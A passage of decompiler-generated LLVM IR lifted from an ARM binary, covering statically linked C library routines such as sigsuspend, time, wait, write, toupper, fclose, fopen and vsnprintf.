  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1097c, { 1, 0 }
  uselistorder label %dec_label_pc_10978, { 1, 0 }
  uselistorder label %dec_label_pc_10958, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10984 = load i32, i32* @r4, align 4
  store i32 %v3_10984, i32* %stack_var_-8, align 4
  %v3_1098c = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_1098c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_1098c, -4095
  br i1 %tmp, label %dec_label_pc_109ac, label %dec_label_pc_1099c

dec_label_pc_1099c:                               ; preds = %entry
  %v0_1099c = call i32 @__errno_location()
  %v0_109a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_109a0 = sub i32 0, %v0_109a0
  %v2_109a4 = inttoptr i32 %v0_1099c to i32*
  store i32 %v1_109a0, i32* %v2_109a4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109ac

dec_label_pc_109ac:                               ; preds = %entry, %dec_label_pc_1099c
  %v0_109ac = phi i32 [ %v3_1098c, %entry ], [ -1, %dec_label_pc_1099c ]
  %v2_109b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_109b0, i32* @r4, align 4
  ret i32 %v0_109ac

; uselistorder directives
  uselistorder i32 %v3_1098c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109ac, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109b4 = load i32, i32* @r4, align 4
  store i32 %v3_109b4, i32* %stack_var_-8, align 4
  %v2_109b8 = call i32 @time(i32* %arg1)
  store i32 %v2_109b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_109b8, -4095
  br i1 %tmp, label %dec_label_pc_109d8, label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %entry
  %v0_109c8 = call i32 @__errno_location()
  %v0_109cc = load i32, i32* %r4.global-to-local, align 4
  %v1_109cc = sub i32 0, %v0_109cc
  %v2_109d0 = inttoptr i32 %v0_109c8 to i32*
  store i32 %v1_109cc, i32* %v2_109d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %entry, %dec_label_pc_109c8
  %v0_109d8 = phi i32 [ %v2_109b8, %entry ], [ -1, %dec_label_pc_109c8 ]
  %v2_109dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_109dc, i32* @r4, align 4
  ret i32 %v0_109d8

; uselistorder directives
  uselistorder i32 %v2_109b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_109d8, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v0_109f0 = call i32 @wait4()
  ret i32 %v0_109f0
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109f4 = load i32, i32* @r4, align 4
  store i32 %v3_109f4, i32* %stack_var_-8, align 4
  %v0_109f8 = call i32 @wait4()
  store i32 %v0_109f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109f8, -4095
  br i1 %tmp, label %dec_label_pc_10a18, label %dec_label_pc_10a08

dec_label_pc_10a08:                               ; preds = %entry
  %v0_10a08 = call i32 @__errno_location()
  %v0_10a0c = load i32, i32* %r4.global-to-local, align 4
  %v1_10a0c = sub i32 0, %v0_10a0c
  %v2_10a10 = inttoptr i32 %v0_10a08 to i32*
  store i32 %v1_10a0c, i32* %v2_10a10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10a18

dec_label_pc_10a18:                               ; preds = %entry, %dec_label_pc_10a08
  %v0_10a18 = phi i32 [ %v0_109f8, %entry ], [ -1, %dec_label_pc_10a08 ]
  %v2_10a1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10a1c, i32* @r4, align 4
  ret i32 %v0_10a18

; uselistorder directives
  uselistorder i32 %v0_109f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10a18, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10a24 = call i32 @wait4()
  ret i32 %v0_10a24
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10a28 = load i32, i32* @r4, align 4
  store i32 %v3_10a28, i32* %stack_var_-8, align 4
  %v0_10a2c = call i32 @write()
  store i32 %v0_10a2c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10a2c, -4095
  br i1 %tmp, label %dec_label_pc_10a4c, label %dec_label_pc_10a3c

dec_label_pc_10a3c:                               ; preds = %entry
  %v0_10a3c = call i32 @__errno_location()
  %v0_10a40 = load i32, i32* %r4.global-to-local, align 4
  %v1_10a40 = sub i32 0, %v0_10a40
  %v2_10a44 = inttoptr i32 %v0_10a3c to i32*
  store i32 %v1_10a40, i32* %v2_10a44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10a4c

dec_label_pc_10a4c:                               ; preds = %entry, %dec_label_pc_10a3c
  %v0_10a4c = phi i32 [ %v0_10a2c, %entry ], [ -1, %dec_label_pc_10a3c ]
  %v2_10a50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10a50, i32* @r4, align 4
  ret i32 %v0_10a4c

; uselistorder directives
  uselistorder i32 %v0_10a2c, { 1, 0, 2 }
  uselistorder i32 ()* @write, { 1, 0 }
  uselistorder label %dec_label_pc_10a4c, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10a5c = icmp slt i32 %arg1, 0
  br i1 %v1_10a5c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_10a5c = mul i32 %arg1, 2
  %v2_10a68 = load i32, i32* @global_var_2b564, align 4
  %v2_10a6c = add i32 %v2_10a68, %v2_10a5c
  %v3_10a70 = inttoptr i32 %v2_10a6c to i8*
  %v4_10a70 = load i8, i8* %v3_10a70, align 1
  %v6_10a70 = zext i8 %v4_10a70 to i32
  %v1_10a74 = add i32 %v2_10a6c, 1
  %v2_10a74 = inttoptr i32 %v1_10a74 to i8*
  %v3_10a74 = load i8, i8* %v2_10a74, align 1
  %v4_10a74 = zext i8 %v3_10a74 to i32
  %v3_10a78 = mul nuw i32 %v4_10a74, 16777216
  %v4_10a7c = sdiv i32 %v3_10a78, 65536
  %v5_10a7c = or i32 %v4_10a7c, %v6_10a70
  ret i32 %v5_10a7c

; uselistorder directives
  uselistorder i32 %v2_10a6c, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10a88 = load i32, i32* @r4, align 4
  store i32 %v3_10a88, i32* %stack_var_-32, align 4
  %v6_10a88 = load i32, i32* @r5, align 4
  %v9_10a88 = load i32, i32* @r6, align 4
  %v12_10a88 = load i32, i32* @r7, align 4
  %v15_10a88 = load i32, i32* @r8, align 4
  %v18_10a88 = load i32, i32* @sb, align 4
  %v21_10a88 = load i32, i32* @sl, align 4
  %v2_10a8c = add i32 %tmp, 52
  %v3_10a8c = inttoptr i32 %v2_10a8c to i32*
  %v4_10a8c = load i32, i32* %v3_10a8c, align 4
  store i32 %v4_10a8c, i32* @r8, align 4
  %v2_10a90 = add i32 %tmp, 56
  store i32 %v2_10a90, i32* @r5, align 4
  %v2_10a94 = ptrtoint i32* %stack_var_-64 to i32
  %v2_10a98 = icmp eq i32 %v4_10a8c, 0
  store i1 %v2_10a98, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_10a90, i32* @r2, align 4
  %v2_10aa8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10aa8, i32* @r0, align 4
  br i1 %v2_10a98, label %dec_label_pc_10ab0, label %dec_label_pc_10acc

dec_label_pc_10ab0:                               ; preds = %entry
  store i32 58060, i32* %r3.global-to-local, align 4
  %v1_10ab8 = call i32 @__pthread_cleanup_push_defer()
  %v0_10abc = load i32, i32* @r5, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  %v2_10ac8 = call i32 @pthread_mutex_lock(i32 %v0_10abc)
  %v0_10acc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %entry, %dec_label_pc_10ab0
  %v0_10ad4 = phi i32 [ %tmp, %entry ], [ %v0_10acc.pre, %dec_label_pc_10ab0 ]
  %v1_10acc = inttoptr i32 %v0_10ad4 to i8*
  %v2_10acc = load i8, i8* %v1_10acc, align 1
  %v3_10acc = zext i8 %v2_10acc to i32
  %v1_10ad0 = and i32 %v3_10acc, 64
  store i32 %v1_10ad0, i32* %r3.global-to-local, align 4
  %v2_10ad0 = icmp eq i32 %v1_10ad0, 0
  store i1 %v2_10ad0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10ad0, i32* @r7, align 4
  br i1 %v2_10ad0, label %dec_label_pc_10ae8, label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %dec_label_pc_10acc
  %v3_10ae0 = call i32 @fflush_unlocked(i8* %v1_10acc)
  store i32 %v3_10ae0, i32* @r7, align 4
  %v0_10ae8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10acc, %dec_label_pc_10ae0
  %v0_10ae8 = phi i32 [ %v0_10ad4, %dec_label_pc_10acc ], [ %v0_10ae8.pre, %dec_label_pc_10ae0 ]
  %v1_10ae8 = add i32 %v0_10ae8, 4
  %v2_10ae8 = inttoptr i32 %v1_10ae8 to i32*
  %v3_10ae8 = load i32, i32* %v2_10ae8, align 4
  store i32 %v3_10ae8, i32* @r0, align 4
  %v1_10aec = call i32 @__libc_close(i32 %v3_10ae8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10af4 = icmp slt i32 %v1_10aec, 0
  %v2_10af4 = icmp eq i32 %v1_10aec, 0
  store i1 %v2_10af4, i1* %cpsr_z.global-to-local, align 1
  %v1_10af8 = load i32, i32* @r4, align 4
  %v2_10af8 = add i32 %v1_10af8, 4
  %v3_10af8 = inttoptr i32 %v2_10af8 to i32*
  store i32 -1, i32* %v3_10af8, align 4
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_10a94, i32* @r0, align 4
  store i32 58060, i32* @sb, align 4
  br i1 %v1_10af4, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_10ae8
  %v3_10b0c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_10b0c, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_10ae8, %bb
  store i32 62768, i32* @sl, align 4
  %v1_10b18 = call i32 @__pthread_cleanup_push_defer()
  %v2_10b24 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b598.559 to i32))
  %v2_10b2c = load i32, i32* @global_var_2deb0.561, align 4
  %v1_10b30 = add i32 %v2_10b2c, 1
  store i32 %v1_10b30, i32* %r3.global-to-local, align 4
  store i32 %v1_10b30, i32* @global_var_2deb0.561, align 4
  store i32 %v2_10a94, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* @r5, align 4
  store i32 68428, i32* @lr, align 4
  %v1_10b48 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10b4c = load i32, i32* @r4, align 4
  %v1_10b4c = inttoptr i32 %v0_10b4c to i32*
  %v2_10b4c = load i32, i32* %v1_10b4c, align 4
  %v1_10b50 = and i32 %v2_10b4c, 24576
  store i32 %v1_10b50, i32* %r3.global-to-local, align 4
  %v3_10b541 = udiv i32 %v1_10b50, 256
  %v1_10b58 = trunc i32 %v3_10b541 to i8
  %v3_10b58 = add i32 %v0_10b4c, 1
  %v4_10b58 = inttoptr i32 %v3_10b58 to i8*
  store i8 %v1_10b58, i8* %v4_10b58, align 1
  %v0_10b5c = load i32, i32* %r3.global-to-local, align 4
  %v1_10b5c = trunc i32 %v0_10b5c to i8
  %v2_10b5c = load i32, i32* @r4, align 4
  %v3_10b5c = inttoptr i32 %v2_10b5c to i8*
  store i8 %v1_10b5c, i8* %v3_10b5c, align 1
  %v0_10b60 = load i32, i32* @r4, align 4
  %v1_10b60 = inttoptr i32 %v0_10b60 to i32*
  %v2_10b60 = load i32, i32* %v1_10b60, align 4
  %v1_10b64 = or i32 %v2_10b60, 48
  store i32 %v1_10b64, i32* %r3.global-to-local, align 4
  %v3_10b68 = sdiv i32 %v2_10b60, 256
  %v0_10b6c = load i32, i32* @r8, align 4
  %v2_10b6c = icmp eq i32 %v0_10b6c, 0
  store i1 %v2_10b6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10a94, i32* @r6, align 4
  store i32 %v2_10aa8, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_10b7c = trunc i32 %v3_10b68 to i8
  %v3_10b7c = add i32 %v0_10b60, 1
  %v4_10b7c = inttoptr i32 %v3_10b7c to i8*
  store i8 %v1_10b7c, i8* %v4_10b7c, align 1
  %v0_10b80 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b80 = trunc i32 %v0_10b80 to i8
  %v2_10b80 = load i32, i32* @r4, align 4
  %v3_10b80 = inttoptr i32 %v2_10b80 to i8*
  store i8 %v1_10b80, i8* %v3_10b80, align 1
  %v0_10b84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10b84, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  store i32 68492, i32* @lr, align 4
  %v2_10b88 = call i32 @__pthread_cleanup_pop_restore()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_10b8c = load i32, i32* @r4, align 4
  %v1_10b8c = add i32 %v0_10b8c, 1
  %v2_10b8c = inttoptr i32 %v1_10b8c to i8*
  %v3_10b8c = load i8, i8* %v2_10b8c, align 1
  %v4_10b8c = zext i8 %v3_10b8c to i32
  store i32 %v4_10b8c, i32* %r3.global-to-local, align 4
  %v1_10b90 = and i32 %v4_10b8c, 64
  %v2_10b90 = icmp eq i32 %v1_10b90, 0
  store i1 %v2_10b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b90, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_10b98 = xor i1 %v2_10b90, true
  call void @__pseudo_cond_branch(i1 %v1_10b98, i32 ptrtoint (i32* @global_var_134b0.563 to i32))
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_10a94, i32* @r0, align 4
  %v1_10bac = call i32 @__pthread_cleanup_push_defer()
  %v2_10bb8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b598.559 to i32))
  %v2_10bc0 = load i32, i32* @global_var_2deb4.566, align 4
  %v1_10bc4 = add i32 %v2_10bc0, 1
  store i32 %v1_10bc4, i32* %r3.global-to-local, align 4
  store i32 %v2_10a94, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_10bc4, i32* @global_var_2deb4.566, align 4
  store i32 68572, i32* @lr, align 4
  %v1_10bd8 = call i32 @__pthread_cleanup_pop_restore()
  %v1_10bdc = call i32 @_stdio_openlist_dec_use(i32 %v1_10bd8)
  %v0_10be0 = load i32, i32* @r7, align 4
  %v2_10be8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10be8, i32* @r4, align 4
  store i32 %v6_10a88, i32* @r5, align 4
  store i32 %v9_10a88, i32* @r6, align 4
  store i32 %v12_10a88, i32* @r7, align 4
  store i32 %v15_10a88, i32* @r8, align 4
  store i32 %v18_10a88, i32* @sb, align 4
  store i32 %v21_10a88, i32* @sl, align 4
  ret i32 %v0_10be0

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_10ae8, { 1, 0 }
  uselistorder label %dec_label_pc_10acc, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_10c10 = call i32 @_stdio_fopen()
  ret i32 %v0_10c10
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 -1, i32* @r1, align 4
  %v0_10c20 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10c20
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_10c30 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_10c30, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_10c44 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10c44

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_10c58 = load i32, i32* @r4, align 4
  %v6_10c58 = load i32, i32* @r5, align 4
  %v12_10c58 = load i32, i32* @r7, align 4
  %v15_10c58 = load i32, i32* @r8, align 4
  %v18_10c58 = load i32, i32* @sl, align 4
  %v0_10c5c = load i32, i32* @r3, align 4
  store i32 %v0_10c5c, i32* @r8, align 4
  %v2_10c60 = ptrtoint i32* %stack_var_-108 to i32
  %v0_10c68 = load i32, i32* @r0, align 4
  %v1_10c68 = sub i32 -1, %v0_10c68
  store i32 %v1_10c68, i32* @r5, align 4
  store i32 %v0_10c68, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_10c7c = load i32, i32* @r1, align 4
  %v3_10c7c = icmp ult i32 %v1_10c68, %v1_10c7c
  br i1 %v3_10c7c, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_10c7c, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_10c84 = load i32, i32* @r2, align 4
  store i32 %v0_10c84, i32* @r7, align 4
  %v2_10c88 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10c88, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_10ca4 = call i32 @__stdio_init_mutex()
  %v0_10ca8 = load i32, i32* @r4, align 4
  %v1_10ca8 = load i32, i32* @r5, align 4
  %v0_10cb0 = load i32, i32* @r7, align 4
  %v0_10cb4 = load i32, i32* @r8, align 4
  %v3_10cd4 = inttoptr i32 %v0_10cb0 to i8*
  %v4_10cd4 = call i32 @_vfprintf_internal(i32 %v2_10c60, i8* %v3_10cd4, i32 %v0_10cb4)
  %v0_10cd8 = load i32, i32* @r5, align 4
  %v1_10cd8 = load i32, i32* @sl, align 4
  %v9_10cd8 = icmp eq i32 %v0_10cd8, %v1_10cd8
  br i1 %v9_10cd8, label %dec_label_pc_10d00, label %dec_label_pc_10ce4

dec_label_pc_10ce4:                               ; preds = %bb23
  %v9_10cec = icmp eq i32 %v1_10ca8, 0
  %v1_10cf0 = sext i1 %v9_10cec to i32
  %v1_10cf0.v0_10ccc = add i32 %v0_10ca8, %v1_10cf0
  %stack_var_-92.0 = inttoptr i32 %v1_10cf0.v0_10ccc to i8*
  %v1_10cfc = trunc i32 %v1_10cd8 to i8
  store i8 %v1_10cfc, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %bb23, %dec_label_pc_10ce4
  store i32 %v3_10c58, i32* @r4, align 4
  store i32 %v6_10c58, i32* @r5, align 4
  store i32 %v12_10c58, i32* @r7, align 4
  store i32 %v15_10c58, i32* @r8, align 4
  store i32 %v18_10c58, i32* @sl, align 4
  ret i32 %v4_10cd4

; uselistorder directives
  uselistorder i32 %v1_10c7c, { 1, 0 }
  uselistorder i32 %v0_10c68, { 1, 0 }
  uselistorder label %dec_label_pc_10d00, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10d08 = load i32, i32* @r4, align 4
  store i32 %v3_10d08, i32* %stack_var_-24, align 4
  %v6_10d08 = load i32, i32* @r5, align 4
  %v9_10d08 = load i32, i32* @r6, align 4
  %v12_10d08 = load i32, i32* @r7, align 4
  %v15_10d08 = load i32, i32* @r8, align 4
  %v0_10d0c = load i32, i32* @r1, align 4
  %v1_10d0c = inttoptr i32 %v0_10d0c to i8*
  %v2_10d0c = load i8, i8* %v1_10d0c, align 1
  %v7_10d10 = icmp eq i8 %v2_10d0c, 114
  store i1 %v7_10d10, i1* %cpsr_z.global-to-local, align 1
  %v2_10d14 = ptrtoint i32* %stack_var_-56 to i32
  %v0_10d18 = load i32, i32* @r0, align 4
  store i32 %v0_10d18, i32* @r6, align 4
  %v0_10d1c = load i32, i32* @r2, align 4
  store i32 %v0_10d1c, i32* @r8, align 4
  %v0_10d20 = load i32, i32* @r3, align 4
  store i32 %v0_10d20, i32* @r5, align 4
  br i1 %v7_10d10, label %dec_label_pc_10d6c, label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %entry
  %v7_10d28 = icmp eq i8 %v2_10d0c, 119
  store i1 %v7_10d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d28, label %bb, label %dec_label_pc_10d34

bb:                                               ; preds = %dec_label_pc_10d28
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d28
  %v7_10d34 = icmp eq i8 %v2_10d0c, 97
  store i1 %v7_10d34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d34, label %bb30, label %dec_label_pc_10d40

bb30:                                             ; preds = %dec_label_pc_10d34
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d34, %dec_label_pc_10df8, %dec_label_pc_10dcc
  %v0_10d40 = call i32 @__errno_location()
  store i32 %v0_10d40, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_10d48 = load i32, i32* @r8, align 4
  %v2_10d48 = icmp eq i32 %v0_10d48, 0
  store i1 %v2_10d48, i1* %cpsr_z.global-to-local, align 1
  %v2_10d4c = inttoptr i32 %v0_10d40 to i32*
  store i32 22, i32* %v2_10d4c, align 4
  br i1 %v2_10d48, label %dec_label_pc_10fc0, label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10e1c._crit_edge, %dec_label_pc_10d40
  %v0_10d54 = load i32, i32* @r8, align 4
  %v1_10d54 = add i32 %v0_10d54, 1
  %v2_10d54 = inttoptr i32 %v1_10d54 to i8*
  %v3_10d54 = load i8, i8* %v2_10d54, align 1
  %v4_10d54 = zext i8 %v3_10d54 to i32
  store i32 %v4_10d54, i32* %r3.global-to-local, align 4
  %v1_10d58 = and i32 %v4_10d54, 32
  %v2_10d58 = icmp eq i32 %v1_10d58, 0
  store i1 %v2_10d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d58, label %dec_label_pc_10fc0, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d54
  store i32 %v0_10d54, i32* @r0, align 4
  %v0_10d64 = call i32 @free()
  store i32 %v0_10d64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc0

dec_label_pc_10d6c:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %bb, %bb30, %dec_label_pc_10d6c
  %v1_10d88 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_10d6c ]
  %v1_10d70 = add i32 %v0_10d0c, 1
  %v2_10d70 = inttoptr i32 %v1_10d70 to i8*
  %v3_10d70 = load i8, i8* %v2_10d70, align 1
  %v7_10d74 = icmp eq i8 %v3_10d70, 98
  store i1 %v7_10d74, i1* %cpsr_z.global-to-local, align 1
  %v1_10d70.v0_10d0c = select i1 %v7_10d74, i32 %v1_10d70, i32 %v0_10d0c
  store i32 %v1_10d70.v0_10d0c, i32* %r3.global-to-local, align 4
  %v1_10d80 = add i32 %v1_10d70.v0_10d0c, 1
  %v2_10d80 = inttoptr i32 %v1_10d80 to i8*
  %v3_10d80 = load i8, i8* %v2_10d80, align 1
  %v4_10d80 = zext i8 %v3_10d80 to i32
  store i32 %v4_10d80, i32* %r3.global-to-local, align 4
  %v7_10d84 = icmp eq i8 %v3_10d80, 43
  store i1 %v7_10d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d84, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_10d70
  store i32 %v1_10d88, i32* %r3.global-to-local, align 4
  %v2_10d8c = add nuw nsw i32 %v1_10d88, 1
  store i32 %v2_10d8c, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10d70, %bb33
  %v2_10d90 = icmp eq i32 %v0_10d1c, 0
  store i1 %v2_10d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d90, label %dec_label_pc_10d98, label %dec_label_pc_10dc4

dec_label_pc_10d98:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_10d9c = call i32 @malloc(i32 80)
  store i32 %v1_10d9c, i32* %r0.global-to-local, align 4
  store i32 %v1_10d9c, i32* @r8, align 4
  %v3_10da0 = icmp eq i32 %v1_10d9c, 0
  store i1 %v3_10da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10da0, label %dec_label_pc_10fc4, label %dec_label_pc_10da8

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10d98
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_10db0 = add i32 %v1_10d9c, 1
  %v4_10db0 = inttoptr i32 %v3_10db0 to i8*
  store i8 32, i8* %v4_10db0, align 1
  %v0_10db4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10db4 = load i32, i32* @r8, align 4
  %v2_10db4 = add i32 %v1_10db4, 8
  %v3_10db4 = inttoptr i32 %v2_10db4 to i32*
  store i32 %v0_10db4, i32* %v3_10db4, align 4
  %v0_10db8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10db8 = trunc i32 %v0_10db8 to i8
  %v2_10db8 = load i32, i32* @r8, align 4
  %v3_10db8 = inttoptr i32 %v2_10db8 to i8*
  store i8 %v1_10db8, i8* %v3_10db8, align 1
  %v0_10dbc = load i32, i32* @r8, align 4
  %v1_10dbc = add i32 %v0_10dbc, 56
  store i32 %v1_10dbc, i32* @r0, align 4
  %v0_10dc0 = call i32 @__stdio_init_mutex()
  store i32 %v0_10dc0, i32* %r0.global-to-local, align 4
  %v0_10dc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10dc4

dec_label_pc_10dc4:                               ; preds = %.thread4, %dec_label_pc_10da8
  %v0_10e1c = phi i32 [ %v0_10d20, %.thread4 ], [ %v0_10dc4.pre, %dec_label_pc_10da8 ]
  %v1_10dc4 = icmp slt i32 %v0_10e1c, 0
  %v2_10dc4 = icmp eq i32 %v0_10e1c, 0
  store i1 %v2_10dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_10dc4, label %dec_label_pc_10e1c, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10dc4
  %v0_10dd0 = load i32, i32* @r4, align 4
  %v2_10dd0 = and i32 %v0_10dd0, 131075
  %v1_10dd4 = add nuw nsw i32 %v2_10dd0, 1
  store i32 %v1_10dd4, i32* %r2.global-to-local, align 4
  %v0_10dd8 = load i32, i32* @r6, align 4
  %v1_10dd8 = add i32 %v0_10dd8, 1
  %v2_10ddc = and i32 %v1_10dd8, %v1_10dd4
